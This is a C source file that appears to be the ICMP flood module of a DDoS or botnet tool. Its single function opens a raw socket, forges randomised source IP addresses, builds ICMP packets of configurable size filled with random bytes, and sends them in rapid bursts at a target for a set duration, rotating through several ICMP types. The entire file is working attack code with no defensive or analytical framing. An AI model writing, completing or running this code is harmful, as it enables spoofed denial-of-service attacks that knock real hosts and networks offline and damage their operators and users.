#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>

#include "icmp_attack.h"
#include "../headers/protocol.h"

#define ICMP_MAX_PAYLOAD 65500
#define ICMP_DEFAULT_PAYLOAD 1400

static uint16_t icmp_checksum(void* data, int len) {
    uint32_t sum = 0;
    uint16_t* ptr = (uint16_t*)data;
    
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    
    if (len == 1) {
        sum += *(uint8_t*)ptr;
    }
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return (uint16_t)(~sum);
}

static uint32_t rand_ip(void) {
    return (rand() % 223 + 1) << 24 |
           (rand() % 255) << 16 |
           (rand() % 255) << 8 |
           (rand() % 254 + 1);
}

void* icmp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    attack_option* opt_psize = find_option(params, OPT_PSIZE);
    uint16_t psize = opt_psize ? get_option_u16(opt_psize) : ICMP_DEFAULT_PAYLOAD;
    if (psize > ICMP_MAX_PAYLOAD) psize = ICMP_MAX_PAYLOAD;
    if (psize < 8) psize = 8;

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return NULL;

    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
        close(fd);
        return NULL;
    }

    int sndbuf = 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    size_t total_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + psize;
    char* packet = (char*)malloc(total_len);
    if (!packet) {
        close(fd);
        return NULL;
    }

    struct iphdr* ip = (struct iphdr*)packet;
    struct icmphdr* icmp = (struct icmphdr*)(packet + sizeof(struct iphdr));
    char* payload = packet + sizeof(struct iphdr) + sizeof(struct icmphdr);

    for (uint16_t i = 0; i < psize; i++) {
        payload[i] = rand() & 0xFF;
    }

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(total_len);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->daddr = params->target_addr.sin_addr.s_addr;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;

    time_t end_time = time(NULL) + params->duration;
    uint16_t seq = 0;
    uint8_t icmp_types[] = {ICMP_ECHO, ICMP_TIMESTAMP, ICMP_INFO_REQUEST, ICMP_ADDRESS};
    int type_count = 4;
    int type_idx = 0;

    srand(time(NULL) ^ getpid());

    while (time(NULL) < end_time && params->active) {
        for (int burst = 0; burst < 100 && params->active; burst++) {
            ip->id = htons(rand() & 0xFFFF);
            ip->saddr = rand_ip();
            ip->check = 0;

            icmp->type = icmp_types[type_idx];
            icmp->code = 0;
            icmp->un.echo.id = htons(rand() & 0xFFFF);
            icmp->un.echo.sequence = htons(seq++);
            icmp->checksum = 0;
            icmp->checksum = icmp_checksum(icmp, sizeof(struct icmphdr) + psize);

            sendto(fd, packet, total_len, MSG_NOSIGNAL, (struct sockaddr*)&dest, sizeof(dest));

            type_idx = (type_idx + 1) % type_count;
        }

        usleep(100);
    }

    free(packet);
    close(fd);
    return NULL;
}